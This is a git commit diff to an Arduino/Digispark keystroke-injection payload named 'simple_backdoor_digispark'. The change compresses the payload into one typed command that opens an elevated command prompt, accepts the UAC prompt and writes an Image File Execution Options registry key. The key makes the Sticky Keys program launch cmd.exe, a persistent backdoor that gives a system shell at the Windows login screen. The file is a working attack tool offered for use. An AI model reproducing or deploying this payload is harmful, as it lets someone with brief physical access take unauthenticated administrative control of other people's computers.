c4c373d0d9b675b840d42222292f49ecb0055a42
8figalltimepro <74225734+8figalltimepro@users.noreply.github.com>
2021-12-12 13:41:38 +0530

    Update simple_backdoor_digispark.ino

--- Payloads/simple_backdoor_digispark/simple_backdoor_digispark.ino
+++ Payloads/simple_backdoor_digispark/simple_backdoor_digispark.ino
@@ -23,45 +23,12 @@ void loop() {
  
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(200);
-  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1"); //starting admin cmd
+  DigiKeyboard.print("cmd /C mode con: cols=15 lines=1 && reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f "); //starting admin cmd using /C as in close the cmd and then replaing cmd.exe to high contrast. so basically shoul take less than 2 seconds if the delays are reducd even more
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); 
-  DigiKeyboard.delay(1500);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
-  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
-  for(int i =0; i < 50; i++)
-    {
-      DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-    }
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
-  DigiKeyboard.delay(500);    
-  DigiKeyboard.print("reg add "); //sorry I was getting confused on how to correctly add the / symbols. you can convert it to a one-liner.
-  DigiKeyboard.print("\"");
-  DigiKeyboard.print("HKEY_LOCAL_MACHINE");
-  DigiKeyboard.print("\\SOFTWARE");
-  DigiKeyboard.print("\\Microsoft\\Windows NT\\CurrentVersion\\Image");
-  DigiKeyboard.print(" File Execution Options\\sethc.exe");
-  DigiKeyboard.print("\"");
-  DigiKeyboard.print(" /v ");
-  DigiKeyboard.print("\"");
-  DigiKeyboard.print("Debugger");
-  DigiKeyboard.print("\"");
-  DigiKeyboard.print(" /t ");
-  DigiKeyboard.print("REG_SZ ");
-  DigiKeyboard.print("/d ");
-  DigiKeyboard.print("\"");
-  DigiKeyboard.print("C:\\windows\\system32\\cmd.exe");
-  DigiKeyboard.print("\"");
-  DigiKeyboard.print(" /f");// replace highcontrast to cmd
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("exit");//exit
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(200);
   digitalWrite(1, HIGH); //turn on led when program finishes
   DigiKeyboard.delay(90000);
   digitalWrite(1, LOW); 
